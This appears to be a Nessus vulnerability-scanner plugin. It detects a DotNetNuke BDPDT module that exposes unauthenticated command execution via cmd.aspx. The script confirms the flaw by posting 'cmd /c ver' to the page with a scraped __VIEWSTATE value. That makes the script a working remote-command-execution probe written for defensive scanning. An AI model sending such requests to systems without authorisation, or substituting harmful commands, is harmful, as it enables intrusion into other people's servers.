#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains an ASP application that allows
execution of arbitrary commands. 

Description :

The remote host contains BDPDT, a database abstraction layer used in 
various add-on modules for DotNetNuke. 

The installed version of the BDPDT contains several ASP scripts that
allow an unauthenticated attacker to gain control of the affected
host, either directly by allowing execution of arbitrary commands
through the 'cmd.aspx' script or indirectly by uploading arbitrary
files with the 'UploadFilePopUp.aspx' script. 

See also :

http://forums.asp.net/thread/1276672.aspx
http://blogs.wwwcoder.com/psantry/archive/2006/05/03/23851.aspx

Solution :

Contact the vendor for a newer version of the module. 

Risk factor : 

Critical / CVSS Base Score : 10 
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";


if (description)
{
  script_id(21747);
  script_version("$Revision: 1.3 $");

  script_name(english:"BDPDT Arbitrary Code Execution Vulnerabilities");
  script_summary(english:"Tries to executes a command via BDPDT's cmd.aspx");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_asp(port:port)) exit(0);


# Make sure the script exists.
url = "/DesktopModules/BDPDT/cmd.aspx";
req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# If it does...
if ('<input type="hidden" name="__VIEWSTATE"' >< res)
{
  # Grab the hidden __VIEWSTATE variable's value.
  pat = '<input type="hidden" name="__VIEWSTATE" value="([^"]+)"';
  matches = egrep(string:res, pattern:pat);
  if (matches)
  {
    foreach match (split(matches))
    {
      match = chomp(match);
      vs = eregmatch(pattern:pat, string:match);
      if (vs == NULL) break;
      vs = vs[1];
      break;
    }
  }

  # If we have the value...
  if (!isnull(vs))
  {
    # Try to run a command.
    cmd = "cmd /c ver";
    postdata = string(
      "__VIEWSTATE=", vs, "&",
      "cmd=", urlencode(str:cmd), "&",
      "Button=Run"
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if it looks like the output of the command.
    if (
      'id="result"' >< res && 
      egrep(pattern:"^Microsoft Windows .+ \[Version", string:res)
    )
    {
      output = strstr(res, "<pre>");
      if (output) output = output - "<pre>";
      if (output) output = output - strstr(output, "</pre>");

      if (output)
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote host,\n",
          "which produced the following output :\n",
          "\n",
          output
        );
      else report = desc;

      security_hole(port:port, data:report);
      exit(0);
    }
  }
}
